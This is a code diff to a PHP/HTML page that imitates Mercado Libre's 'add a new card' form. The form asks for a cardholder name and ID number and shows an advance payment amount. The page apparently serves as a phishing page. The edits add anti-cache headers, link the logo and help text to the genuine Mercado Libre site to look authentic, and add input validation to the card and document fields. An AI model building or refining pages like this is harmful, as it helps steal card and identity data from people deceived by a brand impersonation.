@@ -26,6 +26,9 @@ $anticipo_formateado = number_format($anticipo_pagar, 0, ',', '.');
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Agrega una nueva tarjeta - Mercado Libre</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600&display=swap" rel="stylesheet">
@@ -385,9 +388,9 @@ $anticipo_formateado = number_format($anticipo_pagar, 0, ',', '.');
     <!-- HEADER -->
     <header class="ml-header">
         <div class="nav-bounds">
-            <a href="#" class="nav-logo"></a>
+            <a href="https://www.mercadolibre.com.co" target="_blank" class="nav-logo"></a>
             <div class="nav-user">
-                <span style="background: #fff; border-radius:12px; padding:2px 8px; font-weight:600;">AG</span> Amir ⌵ &nbsp;&nbsp; Ayuda / PQR
+                <span style="background: #fff; border-radius:12px; padding:2px 8px; font-weight:600;">AG</span> Amir ⌵ &nbsp;&nbsp; <a href="https://www.mercadolibre.com.co/ayuda" target="_blank" style="color:#333; text-decoration:none; font-weight:600;">Ayuda / PQR</a>
             </div>
         </div>
     </header>
@@ -423,7 +426,7 @@ $anticipo_formateado = number_format($anticipo_pagar, 0, ',', '.');
 
                             <div class="input-group">
                                 <label>Nombre del titular</label>
-                                <input type="text" id="ccname" class="input-control" placeholder="Ej.: María López">
+                                <input type="text" id="ccname" class="input-control" placeholder="Ej.: María López" maxlength="70" minlength="3">
                                 <div class="input-hint">Como aparece en la tarjeta</div>
                             </div>
 
@@ -445,7 +448,7 @@ $anticipo_formateado = number_format($anticipo_pagar, 0, ',', '.');
                                         <option>CC</option>
                                         <option>CE</option>
                                     </select>
-                                    <input type="text" id="ccdoc" class="input-control doc-input" placeholder="0.000.000.000">
+                                    <input type="text" id="ccdoc" class="input-control doc-input" placeholder="123456789" maxlength="10" minlength="6" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                                 </div>
                             </div>
                         </form>
